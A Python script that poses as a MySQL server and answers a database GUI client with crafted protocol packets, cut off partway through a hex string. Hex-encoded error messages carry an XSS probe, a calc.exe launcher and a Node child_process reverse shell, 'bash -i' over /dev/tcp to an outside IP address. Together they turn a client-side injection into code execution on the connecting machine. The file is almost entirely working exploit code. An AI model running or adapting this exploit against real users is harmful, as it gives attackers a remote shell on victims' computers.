from pwn import *
import socket

AUTO_ALERT_ATTACK = b"\x76\x00\x00\x01\xff\x0c\x05\x23\x32\x32\x30\x30\x37\x49\x6e\x63\x6f\x72\x72\x65\x63\x74\x20\x64\x61\x74\x65\x74\x69\x6d\x65\x20\x76\x61\x6c\x75\x65\x3a\x20\x27\x3c\x69\x6e\x70\x75\x74\x20\x61\x75\x74\x6f\x66\x6f\x63\x75\x73\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x22\x61\x6c\x65\x72\x74\x28\x31\x29\x22\x3e\x61\x73\x64\x66\x3c\x2f\x69\x6e\x70\x75\x74\x3e\x27\x20\x66\x6f\x72\x20\x63\x6f\x6c\x75\x6d\x6e\x20\x27\x63\x72\x65\x61\x74\x65\x64\x5f\x61\x74\x27\x20\x61\x74\x20\x72\x6f\x77\x20\x31"
REVERSE_SHELL_ATTACK = b"\xc6\x00\x00\x01\xff\x0c\x05\x23\x32\x32\x30\x30\x37\x49\x6e\x63\x6f\x72\x72\x65\x63\x74\x20\x64\x61\x74\x65\x74\x69\x6d\x65\x20\x76\x61\x6c\x75\x65\x3a\x20\x27\x3c\x69\x6e\x70\x75\x74\x20\x61\x75\x74\x6f\x66\x6f\x63\x75\x73\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x22\x72\x65\x71\x75\x69\x72\x65\x28\x27\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x27\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x60\x62\x61\x73\x68\x20\x2d\x63\x20\x27\x65\x78\x65\x63\x20\x62\x61\x73\x68\x20\x2d\x69\x20\x26\x3e\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x35\x32\x2e\x37\x38\x2e\x31\x34\x35\x2e\x31\x37\x36\x2f\x35\x34\x38\x36\x39\x20\x3c\x26\x31\x27\x60\x29\x22\x3e\x31\x32\x33\x3c\x2f\x70\x27\x20\x66\x6f\x72\x20\x63\x6f\x6c\x75\x6d\x6e\x20\x27\x63\x72\x65\x61\x74\x65\x64\x5f\x61\x74\x27\x20\x61\x74\x20\x72\x6f\x77\x20\x31"
OPEN_CALC_ATTACK = b"\x9b\x00\x00\x01\xff\x0c\x05\x23\x32\x32\x30\x30\x37\x49\x6e\x63\x6f\x72\x72\x65\x63\x74\x20\x64\x61\x74\x65\x74\x69\x6d\x65\x20\x76\x61\x6c\x75\x65\x3a\x20\x27\x3c\x69\x6e\x70\x75\x74\x20\x61\x75\x74\x6f\x66\x6f\x63\x75\x73\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x22\x72\x65\x71\x75\x69\x72\x65\x28\x27\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x27\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x27\x63\x61\x6c\x63\x2e\x65\x78\x65\x27\x29\x22\x3e\x61\x73\x64\x66\x3c\x2f\x69\x6e\x70\x75\x74\x3e\x27\x20\x66\x6f\x72\x20\x63\x6f\x6c\x75\x6d\x6e\x20\x27\x63\x72\x65\x61\x74\x65\x64\x5f\x61\x74\x27\x20\x61\x74\x20\x72\x6f\x77\x20\x31"

GREETING_1 = b"\x4e\x00\x00\x00\x0a\x35\x2e\x37\x2e\x32\x38\x2d\x6c\x6f\x67\x00\x17\x00\x00\x00\x73\x1c\x6e\x06\x31\x4a\x2e\x21\x00\xff\xff\x08\x02\x00\xff\xc1\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3f\x21\x33\x1a\x4b\x2b\x69\x50\x45\x5b\x0b\x13\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
GREETING_2 = b"\x4e\x00\x00\x00\x0a\x35\x2e\x37\x2e\x32\x38\x2d\x6c\x6f\x67\x00\x18\x00\x00\x00\x18\x49\x48\x5f\x39\x45\x73\x75\x00\xff\xff\x08\x02\x00\xff\xc1\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2f\x2c\x2e\x4f\x2f\x25\x5c\x2a\x29\x42\x6f\x6a\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
GREETING_3 = b"\x4e\x00\x00\x00\x0a\x35\x2e\x37\x2e\x32\x38\x2d\x6c\x6f\x67\x00\x19\x00\x00\x00\x59\x62\x2d\x3a\x4d\x72\x76\x2c\x00\xff\xff\x08\x02\x00\xff\xc1\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2b\x20\x1e\x12\x21\x44\x30\x2b\x16\x49\x45\x13\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
GREETING_4 = b"\x4e\x00\x00\x00\x0a\x35\x2e\x37\x2e\x32\x38\x2d\x6c\x6f\x67\x00\x1a\x00\x00\x00\x72\x03\x4b\x43\x35\x6c\x0b\x47\x00\xff\xff\x08\x02\x00\xff\xc1\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x65\x61\x3b\x02\x39\x56\x7f\x1e\x7d\x5b\x46\x3a\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
GREETINGS = [GREETING_1, GREETING_2, GREETING_3, GREETING_4]

OK = b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"
OK_AFTER_DB = b"\x0f\x00\x00\x02\x00\x00\x00\x02\x40\x00\x00\x00\x06\x01\x04\x03\x70\x6f\x63"

VERSION = b"\x01\x00\x00\x01\x01\x17\x00\x00\x02\x03\x64\x65\x66\x00\x00\x00\x01\x76\x00\x0c\xe0\x00\x28\x00\x00\x00\xfd\x01\x00\x1f\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x02\x00\x0b\x00\x00\x04\x0a\x35\x2e\x37\x2e\x32\x38\x2d\x6c\x6f\x67\x05\x00\x00\x05\xfe\x00\x00\x02\x00"
DBLIST = b"\x01\x00\x00\x01\x01\x4b\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x08\x53\x43\x48\x45\x4d\x41\x54\x41\x08\x53\x43\x48\x45\x4d\x41\x54\x41\x08\x44\x61\x74\x61\x62\x61\x73\x65\x0b\x53\x43\x48\x45\x4d\x41\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x22\x00\x13\x00\x00\x04\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x00\x00\x05\x05\x6d\x79\x73\x71\x6c\x13\x00\x00\x06\x12\x70\x65\x72\x66\x6f\x72\x6d\x61\x6e\x63\x65\x5f\x73\x63\x68\x65\x6d\x61\x04\x00\x00\x07\x03\x70\x6f\x63\x07\x00\x00\x08\x06\x73\x61\x6b\x69\x6c\x61\x04\x00\x00\x09\x03\x73\x79\x73\x06\x00\x00\x0a\x05\x77\x6f\x72\x6c\x64\x05\x00\x00\x0b\xfe\x00\x00\x22\x00"

INIT_1 = b"\x01\x00\x00\x01\x01\x42\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x74\x61\x62\x6c\x65\x73\x06\x54\x41\x42\x4c\x45\x53\x04\x6e\x61\x6d\x65\x0a\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x22\x00\x05\x00\x00\x04\xfe\x00\x00\x22\x00"
INIT_2 = b"\x01\x00\x00\x01\x01\x40\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x05\x76\x69\x65\x77\x73\x05\x56\x49\x45\x57\x53\x04\x6e\x61\x6d\x65\x0a\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x22\x00\x05\x00\x00\x04\xfe\x00\x00\x22\x00"
INIT_3 = b"\x01\x00\x00\x01\x08\x4a\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0a\x74\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x0a\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4c\x00\x00\x03\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0b\x63\x6f\x6c\x75\x6d\x6e\x5f\x6e\x61\x6d\x65\x0b\x43\x4f\x4c\x55\x4d\x4e\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4a\x00\x00\x04\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x09\x64\x61\x74\x61\x5f\x74\x79\x70\x65\x0b\x43\x4f\x4c\x55\x4d\x4e\x5f\x54\x59\x50\x45\x0c\xe0\x00\xf4\xff\x0b\x00\xfc\x11\x00\x00\x00\x00\x4c\x00\x00\x05\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0b\x69\x73\x5f\x6e\x75\x6c\x6c\x61\x62\x6c\x65\x0b\x49\x53\x5f\x4e\x55\x4c\x4c\x41\x42\x4c\x45\x0c\xe0\x00\x0c\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x52\x00\x00\x06\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0e\x63\x6f\x6c\x75\x6d\x6e\x5f\x64\x65\x66\x61\x75\x6c\x74\x0e\x43\x4f\x4c\x55\x4d\x4e\x5f\x44\x45\x46\x41\x55\x4c\x54\x0c\xe0\x00\xf4\xff\x0b\x00\xfc\x10\x00\x00\x00\x00\x56\x00\x00\x07\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x10\x6f\x72\x64\x69\x6e\x61\x6c\x5f\x70\x6f\x73\x69\x74\x69\x6f\x6e\x10\x4f\x52\x44\x49\x4e\x41\x4c\x5f\x50\x4f\x53\x49\x54\x49\x4f\x4e\x0c\x3f\x00\x15\x00\x00\x00\x08\x21\x00\x00\x00\x00\x52\x00\x00\x08\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0e\x63\x6f\x6c\x75\x6d\x6e\x5f\x63\x6f\x6d\x6d\x65\x6e\x74\x0e\x43\x4f\x4c\x55\x4d\x4e\x5f\x43\x4f\x4d\x4d\x45\x4e\x54\x0c\xe0\x00\x00\x10\x00\x00\xfd\x01\x00\x00\x00\x00\x40\x00\x00\x09\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x05\x65\x78\x74\x72\x61\x05\x45\x58\x54\x52\x41\x0c\xe0\x00\x78\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x0a\xfe\x00\x00\x22\x00\x05\x00\x00\x0b\xfe\x00\x00\x22\x00"
INIT_4 = b"\x01\x00\x00\x01\x05\x4b\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x01\x72\x08\x52\x4f\x55\x54\x49\x4e\x45\x53\x0d\x73\x70\x65\x63\x69\x66\x69\x63\x5f\x6e\x61\x6d\x65\x0d\x53\x50\x45\x43\x49\x46\x49\x43\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x49\x00\x00\x03\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x01\x72\x08\x52\x4f\x55\x54\x49\x4e\x45\x53\x0c\x72\x6f\x75\x74\x69\x6e\x65\x5f\x6e\x61\x6d\x65\x0c\x52\x4f\x55\x54\x49\x4e\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x49\x00\x00\x04\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x01\x72\x08\x52\x4f\x55\x54\x49\x4e\x45\x53\x0c\x72\x6f\x75\x74\x69\x6e\x65\x5f\x74\x79\x70\x65\x0c\x52\x4f\x55\x54\x49\x4e\x45\x5f\x54\x59\x50\x45\x0c\xe0\x00\x24\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x43\x00\x00\x05\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x01\x72\x08\x52\x4f\x55\x54\x49\x4e\x45\x53\x09\x64\x61\x74\x61\x5f\x74\x79\x70\x65\x09\x44\x41\x54\x41\x5f\x54\x59\x50\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4f\x00\x00\x06\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x01\x72\x08\x52\x4f\x55\x54\x49\x4e\x45\x53\x06\x6c\x65\x6e\x67\x74\x68\x18\x43\x48\x41\x52\x41\x43\x54\x45\x52\x5f\x4d\x41\x58\x49\x4d\x55\x4d\x5f\x4c\x45\x4e\x47\x54\x48\x0c\x3f\x00\x15\x00\x00\x00\x03\x00\x00\x00\x00\x00\x05\x00\x00\x07\xfe\x00\x00\x22\x00\x05\x00\x00\x08\xfe\x00\x00\x22\x00"
INIT_5 = b"\x01\x00\x00\x01\x05\x4d\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x01\x72\x08\x52\x4f\x55\x54\x49\x4e\x45\x53\x0e\x72\x6f\x75\x74\x69\x6e\x65\x5f\x73\x63\x68\x65\x6d\x61\x0e\x52\x4f\x55\x54\x49\x4e\x45\x5f\x53\x43\x48\x45\x4d\x41\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4b\x00\x00\x03\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x01\x72\x08\x52\x4f\x55\x54\x49\x4e\x45\x53\x0d\x73\x70\x65\x63\x69\x66\x69\x63\x5f\x6e\x61\x6d\x65\x0d\x53\x50\x45\x43\x49\x46\x49\x43\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4f\x00\x00\x04\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x01\x70\x0a\x50\x41\x52\x41\x4d\x45\x54\x45\x52\x53\x0e\x70\x61\x72\x61\x6d\x65\x74\x65\x72\x5f\x6e\x61\x6d\x65\x0e\x50\x41\x52\x41\x4d\x45\x54\x45\x52\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x00\x00\x00\x00\x00\x56\x00\x00\x05\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x01\x70\x0a\x50\x41\x52\x41\x4d\x45\x54\x45\x52\x53\x0b\x63\x68\x61\x72\x5f\x6c\x65\x6e\x67\x74\x68\x18\x43\x48\x41\x52\x41\x43\x54\x45\x52\x5f\x4d\x41\x58\x49\x4d\x55\x4d\x5f\x4c\x45\x4e\x47\x54\x48\x0c\x3f\x00\x15\x00\x00\x00\x03\x00\x00\x00\x00\x00\x45\x00\x00\x06\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x01\x70\x0a\x50\x41\x52\x41\x4d\x45\x54\x45\x52\x53\x09\x64\x61\x74\x61\x5f\x74\x79\x70\x65\x09\x44\x41\x54\x41\x5f\x54\x59\x50\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x00\x00\x00\x00\x00\x05\x00\x00\x07\xfe\x00\x00\x22\x00\x05\x00\x00\x08\xfe\x00\x00\x22\x00"

TABLE_INIT_1 = b"\x01\x00\x00\x01\x01\x42\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x74\x61\x62\x6c\x65\x73\x06\x54\x41\x42\x4c\x45\x53\x04\x6e\x61\x6d\x65\x0a\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x22\x00\x0a\x00\x00\x04\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x05\x00\x00\x05\xfe\x00\x00\x22\x00"
TABLE_INIT_2 = b"\x01\x00\x00\x01\x08\x4a\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0a\x74\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x0a\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4c\x00\x00\x03\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0b\x63\x6f\x6c\x75\x6d\x6e\x5f\x6e\x61\x6d\x65\x0b\x43\x4f\x4c\x55\x4d\x4e\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4a\x00\x00\x04\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x09\x64\x61\x74\x61\x5f\x74\x79\x70\x65\x0b\x43\x4f\x4c\x55\x4d\x4e\x5f\x54\x59\x50\x45\x0c\xe0\x00\xf4\xff\x0b\x00\xfc\x11\x00\x00\x00\x00\x4c\x00\x00\x05\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0b\x69\x73\x5f\x6e\x75\x6c\x6c\x61\x62\x6c\x65\x0b\x49\x53\x5f\x4e\x55\x4c\x4c\x41\x42\x4c\x45\x0c\xe0\x00\x0c\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x52\x00\x00\x06\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0e\x63\x6f\x6c\x75\x6d\x6e\x5f\x64\x65\x66\x61\x75\x6c\x74\x0e\x43\x4f\x4c\x55\x4d\x4e\x5f\x44\x45\x46\x41\x55\x4c\x54\x0c\xe0\x00\xf4\xff\x0b\x00\xfc\x10\x00\x00\x00\x00\x56\x00\x00\x07\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x10\x6f\x72\x64\x69\x6e\x61\x6c\x5f\x70\x6f\x73\x69\x74\x69\x6f\x6e\x10\x4f\x52\x44\x49\x4e\x41\x4c\x5f\x50\x4f\x53\x49\x54\x49\x4f\x4e\x0c\x3f\x00\x15\x00\x00\x00\x08\x21\x00\x00\x00\x00\x52\x00\x00\x08\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0e\x63\x6f\x6c\x75\x6d\x6e\x5f\x63\x6f\x6d\x6d\x65\x6e\x74\x0e\x43\x4f\x4c\x55\x4d\x4e\x5f\x43\x4f\x4d\x4d\x45\x4e\x54\x0c\xe0\x00\x00\x10\x00\x00\xfd\x01\x00\x00\x00\x00\x40\x00\x00\x09\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x05\x65\x78\x74\x72\x61\x05\x45\x58\x54\x52\x41\x0c\xe0\x00\x78\x00\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x0a\xfe\x00\x00\x22\x00\x34\x00\x00\x0b\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x02\x69\x64\x10\x69\x6e\x74\x28\x31\x30\x29\x20\x75\x6e\x73\x69\x67\x6e\x65\x64\x02\x4e\x4f\xfb\x01\x31\x00\x0e\x61\x75\x74\x6f\x5f\x69\x6e\x63\x72\x65\x6d\x65\x6e\x74\x38\x00\x00\x0c\x09\x70\x6f\x63\x5f\x74\x61\x62\x6c\x65\x0a\x63\x72\x65\x61\x74\x65\x64\x5f\x61\x74\x09\x74\x69\x6d\x65\x73\x74\x61\x6d\x70\x02\x4e\x4f\x11\x43\x55\x52\x52\x45\x4e\x54\x5f\x54\x49\x4d\x45\x53\x54\x41\x4d\x50\x01\x32\x00\x00\x05\x00\x00\x0d\xfe\x00\x00\x22\x00"
TABLE_INIT_3 = b"\x01\x00\x00\x01\x01\x40\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x54\x41\x42\x4c\x45\x53\x06\x54\x41\x42\x4c\x45\x53\x02\x74\x74\x0a\x54\x41\x42\x4c\x45\x5f\x54\x59\x50\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x22\x00\x0b\x00\x00\x04\x0a\x42\x41\x53\x45\x20\x54\x41\x42\x4c\x45\x05\x00\x00\x05\xfe\x00\x00\x22\x00"

PID = b"\x01\x00\x00\x01\x01\x19\x00\x00\x02\x03\x64\x65\x66\x00\x00\x00\x03\x70\x69\x64\x00\x0c\x3f\x00\x15\x00\x00\x00\x08\xa1\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x02\x00\x03\x00\x00\x04\x02\x34\x32\x05\x00\x00\x05\xfe\x00\x00\x02\x00"

TRANSACTION=b"\x07\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00"
ROLLBACK = b"\x07\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00"

HOST='0.0.0.0'
PORT=3306
SOCKET_LIST = []
SOCK_PTR = -1
IS_DB_SELECTED = False
IS_TABLE_SELECTED = False
INSERTABLE = False
ERROR = True

def initSocket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST,PORT))
    sock.listen()
    print("Listening: "+HOST+" "+str(PORT))
    return sock

def createSocket(sock):
    clientSocket, addr = sock.accept()
    return clientSocket,addr

def sendBuff(clientSocket, msg):
    try:
        clientSocket.send(msg)
    except e:
        print(e)

def readBuff(clientSocket):
    try:
        data = clientSocket.recv(8192)
        return data
    except:
        return false

if __name__=="__main__":
    sock = initSocket()
    while(True):
        clientSocket,addr = createSocket(sock)
        print("[*] New Socket is made")
        SOCK_PTR += 1
        print("ClientIP: "+addr[0])
        if(SOCK_PTR>=3):
            sendBuff(clientSocket, GREETINGS[3])
        else:
            sendBuff(clientSocket, GREETINGS[SOCK_PTR])
        print("[+] GREETING "+str(SOCK_PTR))
        data = readBuff(clientSocket)
        while(data):
            if(b"SELECT VERSION() as v" in data) :
                print("[+] SELECT VERSION")
                sendBuff(clientSocket, VERSION)
            elif(b"show databases" in data):
                print("[+] show databases")
                sendBuff(clientSocket, DBLIST)
                clientSocket.close()
                break
            elif(b"SELECT table_name as name" in data and b"AND table_type NOT LIKE '%VIEW%'" in data):
                print("[+] SELECT table_name ... AND table_type NOT LIKE '%VIEW%'")
                if(IS_DB_SELECTED):
                    sendBuff(clientSocket,TABLE_INIT_1)
                else:
                    sendBuff(clientSocket,INIT_1)
            elif(b"SELECT table_name as name" in data and b"WHERE table_schema = database()" in data):
                print("[+] SELECT table_name ... WHERE table_schema = database() ORDER BY table_name")
                sendBuff(clientSocket,INIT_2)
            elif(b"table_name AS 'table_name'" in data and b"ORDER BY ordinal_position" in data):
                if(b"AND table_name =" in data):
                    print("[+] SELECT table_name AS 'table_name' ... ORDER BY ordinal_position WHERE table_name='poc_table'")
                    if(INSERTABLE):
                        print("[-] TABLE IS INSERTABLE")
                        sendBuff(clientSocket,b"\x01\x00\x00\x01\x08\x4a\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0a\x74\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x0a\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4c\x00\x00\x03\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x0b\x63\x6f\x6c\x75\x6d\x6e\x5f\x6e\x61\x6d\x65\x0b\x43\x4f\x4c\x55\x4d\x4e\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x4a\x00\x00\x04\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x07\x63\x6f\x6c\x75\x6d\x6e\x73\x07\x43\x4f\x4c\x55\x4d\x4e\x53\x09\x64\x61\x74\x61\x5f\x74\x79\x70\x65\x0b\x43\x4f\x4c\x55\x4d\x4e\x5f\x54\x59\x50\x45\x0c\xe0\x00\xf4\xff\x0b\x00\xfc\x11\x00\x00\x00\x00\x4c\x00\x00\x05\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6